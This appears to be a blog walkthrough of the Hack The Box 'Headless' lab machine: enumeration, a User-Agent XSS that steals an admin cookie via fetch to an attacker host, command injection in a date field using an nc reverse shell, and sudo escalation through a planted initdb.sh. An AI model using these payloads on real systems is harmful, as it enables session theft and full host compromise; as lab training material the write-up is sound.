---
layout: post
title: Hack The Box - Headless
date: 2024-03-24 22:30 +0100
image:
    path: /assets/img/posts/headless/headless-card.png
    alt: The Headless card
categories: [ Hack The Box ]
---

# Introduction

In this comprehensive guide to the "Hack The Box - Headless" challenge, we delve into effective enumeration techniques,
the exploitation of a Flask application, and methods for leveraging vulnerabilities for privilege escalation.

## Enumeration: The First Steps

### Nmap Exploration

```bash
┌──(rether㉿rether)-[~]
└─$ nmap -A 10.10.11.8
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-24 22:28 CET
Nmap scan report for 10.10.11.8
Host is up (0.020s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Sun, 24 Mar 2024 21:29:04 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2799
|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Under Construction</title>
|     <style>
|     body {
|     font-family: 'Arial', sans-serif;
|     background-color: #f7f7f7;
|     margin: 0;
|     padding: 0;
|     display: flex;
|     justify-content: center;
|     align-items: center;
|     height: 100vh;
|     .container {
|     text-align: center;
|     background-color: #fff;
|     border-radius: 10px;
|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=3/24%Time=66009B20%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,BE1,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\
SF:x20Python/3\.11\.2\r\nDate:\x20Sun,\x2024\x20Mar\x202024\x2021:29:04\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x202799\r\nSet-Cookie:\x20is_admin=InVzZXIi\.uAlmXlTvm8vyihjNaPDWnvB_Z
SF:fs;\x20Path=/\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\
SF:x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\
SF:x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-wid
SF:th,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Under\x20Construct
SF:ion</title>\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\x20b
SF:ody\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\
SF:x20'Arial',\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20background-color:\x20#f7f7f7;\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20padding:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20di
SF:splay:\x20flex;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justif
SF:y-content:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:align-items:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20height:\x20100vh;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20\.container\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20text-align:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20background-color:\x20#fff;\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20border-radius:\x2010px;\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20box-shadow:\x200px\x200px\x2020px\x20rgba\(0,\x20
SF:0,\x200,\x200\.2\);\n\x20\x20\x20\x20\x20")%r(RTSPRequest,16C,"<!DOCTYP
SF:E\x20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20
SF:\x20\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x
SF:20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20resp
SF:onse</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20vers
SF:ion\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\
SF:x20code\x20explanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x
SF:20unsupported\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.77 seconds
```

The service on port 5000, running Werkzeug 2.2.2 with Python 3.11.2, suggests a web application development server,
likely a Flask application due to Werkzeug's association with the Flask web framework.

### Flask application - port 5000

![Headless home page](/assets/img/posts/headless/headless-home-page.png){: width="972" height="589" }

When the `For questions` button is clicked, it redirects to the `/support` page.

![Headless support page](/assets/img/posts/headless/headless-support-page.png){: width="972" height="589" }

Utilizing the `dirb` command, we discover a `/dashboard` page.

```bash
┌──(rether㉿rether)-[~]
└─$ dirb http://10.10.11.8:5000/ /usr/share/seclists/Discovery/Web-Content/common.txt 
[...]

---- Scanning URL: http://10.10.11.8:5000/ ----
+ http://10.10.11.8:5000/dashboard (CODE:500|SIZE:265)                                                              
+ http://10.10.11.8:5000/support (CODE:200|SIZE:2363)                                                                                                                                                                                   
```

Attempting to access `/dashboard` resulted in an error message, suggesting restricted access.

![Headless dashboard page](/assets/img/posts/headless/headless-dashboard-no-admin-page.png){: width="972" height="589" }

A XSS attack attempt on the `support` page is detected as a "Hacking Attempt."

![Headless hacking attempt detected](/assets/img/posts/headless/headless-support-hacking-attempt-detected-page.png){:
width="972" height="589" }

The application uses a cookie to determine if the user is an admin:

```text
Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
```

The client request information is given another information:

```text
Method: POST
URL: http://10.10.11.8:5000/support
Headers: Host: 10.10.11.8:5000
Connection: keep-alive
Content-Length: 130
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.11.8:5000
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.11.8:5000/support
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
```

### XSS attack

We can try XSS attack with the other request information.
By trying all of this the only thing that worked was the `User-Agent` header.

```bash
POST /support HTTP/1.1
Host: 10.10.11.8:5000
Content-Length: 103
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.11.8:5000
Content-Type: application/x-www-form-urlencoded
User-Agent: <img src='x' onerror=fetch('http://<your-ip>/'+document.cookie) />
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.11.8:5000/support
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
Connection: close

fname=random&lname=random&email=random%40email.com&phone=0707070707&message=%3Cscript%3E%3C%2Fscript%3E
```

Start a web server to capture the cookie.

```bash
┌──(rether㉿rether)-[~]
└─$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.14.17 - - [25/Mar/2024 13:00:08] code 404, message File not found
10.10.14.17 - - [25/Mar/2024 13:00:08] "GET /is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs HTTP/1.1" 404 -
10.10.11.8 - - [25/Mar/2024 13:00:16] code 404, message File not found
10.10.11.8 - - [25/Mar/2024 13:00:16] "GET /is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 HTTP/1.1" 404 -
```

Now we have the admin cookie

```text
ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
```

We can try to access the `/dashboard` page.

![Headless dashboard page](/assets/img/posts/headless/headless-dashboard-page.png){: width="972" height="589" }

### Command injection

After several attempts, we've discovered a command injection vulnerability located in the date field, allowing us to
execute arbitrary commands. We can try a reverse shell

```bash
nc -lnvp 9001
```

And then send the following request.

```text
POST /dashboard HTTP/1.1
Host: 10.10.11.8:5000
Content-Length: 48
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.11.8:5000
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112
Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*
;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.11.8:5000/dashboard
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
Connection: close

date=2023-09-15;nc <your-ip> 9001 -e /bin/bash
```

And we get a reverse shell.

```bash
┌──(rether㉿rether)-[~]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.11.8] 44052
whoami
dvir
```

We successfully obtain the user flag.

```bash
cat /home/dvir/user.txt
********************************
```

## Privilege Escalation

Checking user privileges reveals that the user dvir can run commands as root without a password, specifically
`/usr/bin/syscheck`.

```bash
sudo -l
Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck
```

The contents of the syscheck script are as follows:

```bash
cat /usr/bin/syscheck
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0
```

Analyzing the syscheck script, we identify an opportunity to exploit the execution of the `initdb.sh` script.
By crafting a malicious `initdb.sh` script that triggers a bash shell and running syscheck with elevated privileges,

```bash
echo "/bin/bash" > initdb.sh
chmod +x ./initdb.sh
```

And then run the syscheck command with admin privileges.

```bash
sudo syscheck
Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 2.0G
System load average:  0.02, 0.02, 0.00
Database service is not running. Starting it...
whoami
root
```

We successfully open a root shell and access the root flag.

```bash
cat /root/root.txt
********************************
```

![Headless pwned card](/assets/img/posts/headless/headless-pwned-card.png){: width="972" height="589" }
